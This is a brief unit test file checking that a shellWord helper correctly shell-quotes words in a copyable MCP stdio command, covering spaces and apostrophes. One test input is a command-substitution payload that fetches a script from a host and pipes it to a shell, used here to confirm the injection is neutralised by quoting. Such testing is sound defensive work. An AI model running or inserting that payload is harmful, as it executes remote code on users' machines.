import { describe, expect, it } from "vitest";
import { shellWord } from "./McpServerEditor";

describe("the copyable stdio command", () => {
  it("quotes words a shell would read differently", () => {
    expect(shellWord("zorvik")).toBe("zorvik");
    expect(shellWord("/Users/ada/api-tests")).toBe("/Users/ada/api-tests");
    expect(shellWord("Weather mock")).toBe("'Weather mock'");
    expect(shellWord("$(curl x.io|sh)")).toBe("'$(curl x.io|sh)'");
    expect(shellWord("Ada's tools")).toBe("'Ada'\\''s tools'");
  });
});
